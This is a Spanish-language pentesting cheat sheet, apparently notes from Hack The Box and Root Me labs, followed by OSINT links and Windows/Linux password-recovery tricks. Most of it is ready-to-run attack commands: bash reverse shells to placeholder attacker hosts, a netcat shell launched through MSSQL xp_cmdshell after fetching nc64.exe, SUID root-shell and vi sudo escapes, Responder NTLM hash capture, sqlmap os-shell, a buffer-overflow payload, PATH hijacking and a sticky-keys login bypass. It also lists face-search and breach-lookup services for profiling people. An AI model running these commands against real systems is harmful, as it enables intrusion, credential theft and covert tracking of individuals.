<h1 style="text-align:center;font-size:40px;">LINUX Acad</h1>

## Y

### nmap

```sh
nmap 192.168.1.0/24 -sn # escanear red
nmap 192.168.1.X -O # ver informacion del sistema operativo
nmap 192.168.1.X -sV # ver versiones
nmap 192.168.1.X --script vuln # escanear vulnerabilidades
nmap -v -p- --min-rate 5000 -sV -sC X
sudo nmap -n -PN -sS -sC -sV -T5 -p- 192.168.1.X
```

> -v : Increase the verbosity level (basically output more info)
> 
> -p- : This flag scans for all TCP ports ranging from 0-65535
> 
> -sV : Attempts to determine the version of the service running on a port
> 
> -sC : Scan with default NSE scripts
> 
> --min-rate : This is used to specify the minimum number of packets Nmap should send per second; it speeds up the scan as the number goes higher

Escaneo basico:

```sh
nmap -A -T4 scanme.nmap.org
```

### LINUX REMOTO

#### FULL TTY

```sh
python -c 'import pty;pty.spawn("/bin/bash")' # python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl + Z para segundo plano
stty raw -echo;fg;ls; export SHELL=/bin/bash;export TERM=xterm-256color # traer tarea
```

```sh
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### Escalar

- [gtfobins](https://gtfobins.github.io)
- [hacktricks](book.hacktricks.xyz)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)

> enviar netcat de un proceso en cron como root
##### Crontab

```sh
#1
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```sh
/tmp/rootbash -p
```

```sh
#2
"bash -i >& /dev/tcp/{ATACANTE}/4444 0>&1 "
```

##### Vi

```sh
# Start Point
# sudo -l =  (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

vi
:set shell=/bin/sh
:shell

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:set shell=/bin/sh
:shell
```


#### Passwords

```sh
cat * | grep -i passw*
```

#### Permisos del Grupo

```sh
find / -perm -4000 -ls 2>/dev/null
find / -group {GROUP} 2>/dev/null
```

## HACK THE BOX

### gobuster

> examinar toda una web

```sh
# Directorios
gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# subdominio
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://{TARGET}
#vhost = brute force
```

### Responder

```sh
sudo responder -I {INTERFACE}
...
[SMB] NTLMv2-SSP Client   : 10.129.15.123
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:a5594096739bf9e3:ABC64563D053CCA7386BB79C55F11B2C:0101000000000000809CDDD98084D901E365E314729680370000000002000800440049003100530001001E00570049004E002D00390046004D005100560054004500360030004F004F0004003400570049004E002D00390046004D005100560054004500360030004F004F002E0044004900310053002E004C004F00430041004C000300140044004900310053002E004C004F00430041004C000500140044004900310053002E004C004F00430041004C0007000800809CDDD98084D9010600040002000000080030003000000000000000010000000020000051BDB3922EAD27F21E94B7C27D1C532EE06FC81BC07B516D0E992B0A73180C290A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310033000000000000000000
```

### john

```sh
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

### impacket

```sh
docker run -i -t rflathers/impacket /bin/sh # git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
# pip3 install .  === sudo python3 setup.py install  === pip3 install -r requirements.txt
impacket-mssqlclient {DOMAIN_NAME}/USER@IP -windows-auth
```

#### Activar xp_cmdshell

```sh
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell "whoami"
```

#### Crear servidor http para copiar archivos

> netcat reverse shell exe

```sh
wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
```

```sh
sudo python3 -m http.server 80

# sql
SQL> xp_cmdshell "powershell -c cd C:\Users\{USER}\; wget http://{HOST}/nc64.exe -outfile nc64.exe"
```

#### crear servidor netcat para escuchar

```sh
sudo nc -lvnp 443

# SQL
SQL> xp_cmdshell "powershell -c pwd"
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {HOST} 443"
```

#### Escalar privilegios

```sh
git clone https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
powershell wget http://IP_ORIG/winPEASx64.exe -outfile winPEASx64.exe
PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe

impacket-psexec administrator@IP
```

#### zips

```sh
zip2john test.zip > hashes.txt
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```

### hash

```sh
admin:2cb42f8734ea607eefed3b70af13bbd3
hashid 2cb42f8734ea607eefed3b70af13bbd3
echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

### sqlmap

[cookie-editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/)

```sh
sqlmap -u 'http://{TARGET}/dashboard.php?search=any+query' --cookie="PHPSESSID={COOKIE}"
sqlmap -u 'http://{TARGET}/dashboard.php?search=any+query' --cookie="PHPSESSID={COOKIE}" --os-shell
bash -c "bash -i >& /dev/tcp/{HOST}/4444 0>&1"

sqlmap -u {TARGET} --dbs # Descubrir bases de datos
sqlmap -u {TARGET} -D {DATABASE_NAME} --tables # Descubrir tablas
sqlmap -u {TARGET} -D {DATABASE_NAME} -T {TABLE} --columns # descubrir columnas
sqlmap -u {TARGET} -D {DATABASE_NAME} -T {TABLE} --dump # exportar datos
```




## ROOT ME

### Bucle 

```sh
for i in {1..10}
do
    echo "$i."
done
```

```sh
python -c 'print("X" * 5)'
```

### Aplicación - Sistema

#### Stack buffer overflow basic 1

```sh
(python -c 'print("X" * 40 + "\xef\xbe\xad\xde")';cat) | ./ch13 #0xdeadbeef  
```

### Aplicación - Guión

#### Python - input()

```sh
./setuid-wrapper 
Please enter password : __import__("os").execl("/bin/sh","sh") # Genera uan terminal sh con los permisos necesarios
```

#### Bash - System 1

```sh
mkdir /tmp/vuln
cp /bin/cat /tmp/vuln
mv /tmp/vuln/cat /tmp/vuln/ls #hacemos crear que el cat es el ls
export PATH=/tmp/vuln:$PATH
./ch11
```

#### Bash - System 2

```sh
mkdir /tmp/vuln
cp /bin/less /tmp/vuln # less tiene los mismos parametros que el script ( -lA ), con cat no funcionaria 
mv /tmp/vuln/cat /tmp/vuln/ls #hacemos crear que el cat es el ls
export PATH=/tmp/vuln:$PATH
```

#### sudo - weak configuration

```sh
# Con sudo y el usuario se puede hacer un cat al archivo 
sudo -u  app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/*  
# Como en /notes/ se puede hacer cat pero en /ch1cracked/ no se hace sobre /notes/ y se vuelve
sudo -u  app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd 
```

## OSINT

### General

[illicit](https://search.illicit.services)

[inteltechniques.com](https://inteltechniques.com/tools/Search.html)

### Fotos 

[Pimeyes](https://pimeyes.com/)

[insta](https://instastories.watch/es/)


### DNS

[dnsdumpster](https://dnsdumpster.com/)

[viewdns](https://viewdns.info)


### correo

[haveibeenpwned](https://haveibeenpwned.com) --> Comprobar filtracion de correo

[iky](https://github.com/kennbroorg/iKy)

[BREACHDIRECTORY.ORG](https://breachdirectory.org)

### Imagenes

[tineye](https://tineye.com)
[yandex](https://yandex.com)

### WEB

[netcraft](https://www.netcraft.com) <-- Información

[whatsmyname](https://whatsmyname.app)

[web-check](https://web-check.as93.net)

#### [shodan.io](https://www.shodan.io)

> motor de búsqueda equipos conectados a Internet

### Telefonos

#### Phoneinfoga

```sh
curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash
sudo install ./phoneinfoga /usr/local/bin/phoneinfoga
phoneinfoga version
phoneinfoga serve -p 81
```

### Maltengo

```sh
nuevo
Phrase con nombre
web > url > IBM
mail / phone [bing] sobre persona
```

## Soluciones

### Recuperar contraseña windows

#### desde LINUX

```sh
vim /etc/fstab

/dev/sda1 /mnt/windows ntfs ro,umask=0222,defaults 0 0
```

#### Windows CD

```ps1
C:\windows\system32\osk.exe o sethc.exe = cmd.exe (copia)
```

> SHIFT x5 / teclado

```ps1
control userpasswords2

net user -- net user administrator *
```

#### CHNTPW

[chntpw](https://www.howtogeek.com/howto/14369/change-or-reset-windows-password-from-a-ubuntu-live-cd/)

### Ejecutar como administrador en linux

> en caso de que no funcione su - / sudo para editar:
> `pkexec` ← pide password desde el entorno grafico


### Cambiar passwd ROOT

> grub
> advanced options for X
> recovery mode	“e”
> linix … ro single init=/bin/bash

### Modificar [grub](https://drive.google.com/drive/folders/1G_pFqJbG9hLI9BOZ9hTaXKn__jJdg81m)

```sh
/boot/grub/grub.cfg
```